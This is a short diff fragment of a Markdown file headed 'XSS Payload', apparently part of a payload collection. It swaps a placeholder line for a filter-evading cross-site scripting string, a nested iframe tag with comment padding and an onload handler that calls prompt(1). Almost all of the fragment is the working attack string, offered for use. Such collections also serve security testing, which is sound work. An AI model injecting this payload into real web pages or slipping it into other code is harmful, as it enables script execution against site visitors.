@@ -1,7 +1,7 @@
 # XSS Payload
 ###
 ```
-lol
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
 ```
 ###
 ```
